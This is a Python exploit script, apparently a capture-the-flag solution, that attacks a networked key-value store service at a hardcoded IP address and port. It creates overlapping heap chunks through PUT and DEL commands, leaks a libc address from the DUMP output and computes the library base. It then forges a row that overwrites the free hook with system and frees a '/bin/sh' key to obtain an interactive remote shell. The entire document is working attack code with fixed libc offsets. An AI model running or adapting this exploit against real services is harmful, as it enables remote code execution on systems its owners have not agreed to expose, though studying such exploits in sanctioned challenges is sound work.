import re
from pwnpwnpwn import *

system = 0x46640
free_hook = 0x3c0a10
binsh = 0x17ccdb

#system =  0x46640
#free_hook = 0x3c1a10 
#binsh = 0x17d87b

payload = ""

host = "52.4.86.204"
port = 64613

sock = make_conn(host,port)

def put(sock,key,size,data):
    recvuntil(sock,"command:")
    sendline(sock,"PUT")
    recvuntil(sock,"key:")
    sendline(sock,key)
    recvuntil(sock,"size:")
    sendline(sock,str(size))
    recvuntil(sock,"data:")
    sendline(sock,data)

def get(sock,key):
    recvuntil(sock,"command:")
    sendline(sock,"GET")
    recvuntil(sock,"key:")
    sendline(sock,"key")

def dele(sock,key):
    recvuntil(sock,"command:")
    sendline(sock,"DEL")
    recvuntil(sock,"key:")
    sendline(sock,key)

def dump(sock):
    recvuntil(sock,"command:")
    sendline(sock,"DUMP")
    recvuntil(sock,"command:")
    sendline(sock,"DUMP")
    data = recvuntil(sock,"PROMPT")
    return data

def overlap_chunk(sock):
    put(sock,"key",584,"a"*584)
    dele(sock,"th3fl4g")
    put(sock,"g"*0x90,20,"b"*20)
    put(sock,"key",20,"c"*20)
    dele(sock,"key")
    dele(sock,"g")
    dele(sock,"p")
    put(sock,"G"*24,128,"d"*128)
    put(sock,"jj",57,"e"*57)
    put(sock,"angel",148,"f"*148)
    put(sock,"orange",138,"h"*138)
    put(sock,"G"*24,128,"i"*128)
    dele(sock,"orange")
    dele(sock,"g"*0x90)
    put(sock,"ppp",128,"j"*128)
    put(sock,"bamboo",0x80,"k"*0x80)

def leaklib(sock):
    pat = r".*Row \[.*\],.*7.*"
    leak =  dump(sock)
    match = re.search(pat,leak)
    leakmemory = match.group()
    leakmemory = leakmemory[11:]
    leakmemory = leakmemory.split("]")
    leakmemory = leakmemory[0].ljust(8,'\x00')
    leakmemory = unpack64(leakmemory)
    libc_base = leakmemory - 0x3be7b8
#    libc_base = leakmemory - 0x3bf7b8
    return libc_base

def hookfree(sock,payload):

    put(sock,"/bin/sh",len(payload),payload)


print "stage 1 : Create a overlap chunk"
overlap_chunk(sock)
print "stage 2 : leak libc_base"
libc_base = leaklib(sock)
print "libc_base : %016x" % (libc_base)

binsh = libc_base+binsh
system = libc_base + system
free_hook = libc_base + free_hook

#fake_row
payload += "a"*0x10
payload += pack64(binsh)
payload += pack64(7)
payload += pack64(0)
payload += pack64(free_hook)
payload += pack64(free_hook-0x30)
payload += pack64(free_hook)
payload += pack64(system)


print "stage 3 : fake_row"
hookfree(sock,payload)
dele(sock,"/bin/sh")
print "Get a Shell : "
inter(sock)

